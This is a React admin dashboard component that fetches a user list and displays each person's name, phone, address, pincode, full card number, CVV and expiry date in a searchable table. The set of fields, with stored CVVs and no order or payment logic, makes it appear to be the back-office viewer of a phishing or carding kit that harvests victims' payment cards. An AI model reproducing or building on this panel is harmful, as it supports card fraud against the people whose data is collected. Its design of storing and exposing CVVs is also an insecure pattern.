import React, { useEffect, useState } from "react";
import axiosInstance from "../AxiosInstance";
import { useNavigate } from "react-router-dom";

const Dashboard = () => {
  const [users, setUsers] = useState([]);
  const [search, setSearch] = useState("");
  const navigate = useNavigate();

  const fetchUsers = async () => {
    try {
      const response = await axiosInstance.get("/admin/users");
      setUsers(response?.data || []);
      console.log(response);
    } catch (error) {
      console.error("Error fetching users:", error);
    }
  };

  const token = localStorage.getItem("token");
  useEffect(() => {
    if (!token) {
      navigate("/admin/login");
    }
  }, [navigate, token]);

  useEffect(() => {
    fetchUsers();
  }, []);

  // 🔍 Search filter
  const filteredUsers = users.filter((user) =>
    Object.values(user).some((value) =>
      String(value).toLowerCase().includes(search.toLowerCase()),
    ),
  );

  // 🚪 Logout function
  const handleLogout = () => {
    localStorage.removeItem("token"); // remove token
    navigate("/admin/login"); // redirect to login
  };

  return (
    <div className="p-6">
      {/* 🔹 Top Section */}
      <div className="flex justify-between items-center mb-4">
        {/* Search */}
        <input
          type="text"
          placeholder="Search anything..."
          className="w-full md:w-1/3 px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black"
          value={search}
          onChange={(e) => setSearch(e.target.value)}
        />

        {/* Logout Button */}
        <button
          onClick={handleLogout}
          className="ml-4 bg-red-500 text-white px-4 py-2 rounded-lg hover:bg-red-600 transition"
        >
          Logout
        </button>
      </div>

      {/* 📋 Table */}
      <div className="overflow-x-auto">
        <table className="min-w-full bg-white border rounded-lg shadow text-sm">
          <thead className="bg-gray-100">
            <tr>
              <th className="p-2 border">ID</th>
              <th className="p-2 border">Full Name</th>
              <th className="p-2 border">Phone</th>
              <th className="p-2 border">Address</th>
              <th className="p-2 border">Pincode</th>
              <th className="p-2 border">Card Number</th>
              <th className="p-2 border">CVV</th>
              <th className="p-2 border">MM</th>
              <th className="p-2 border">YY</th>
              <th className="p-2 border">Created At</th>
            </tr>
          </thead>
          <tbody>
            {filteredUsers.length > 0 ? (
              filteredUsers.map((user, index) => (
                <tr key={user?._id} className="text-center hover:bg-gray-50">
                  <td className="p-2 border">{index + 1}</td>
                  <td className="p-2 border">{user?.fullName}</td>
                  <td className="p-2 border">{user?.phoneNumber}</td>
                  <td className="p-2 border">{user?.address}</td>
                  <td className="p-2 border">{user?.pincode}</td>
                  <td className="p-2 border">{user?.cardNumber}</td>
                  <td className="p-2 border">{user?.cvv}</td>
                  <td className="p-2 border">{user?.mm}</td>
                  <td className="p-2 border">{user?.yy}</td>
                  <td className="p-2 border">
                    {user?.createdAt
                      ? new Date(user?.createdAt).toLocaleString()
                      : "N/A"}
                  </td>
                </tr>
              ))
            ) : (
              <tr>
                <td colSpan="11" className="p-4 text-center text-gray-500">
                  No data found
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
};

export default Dashboard;
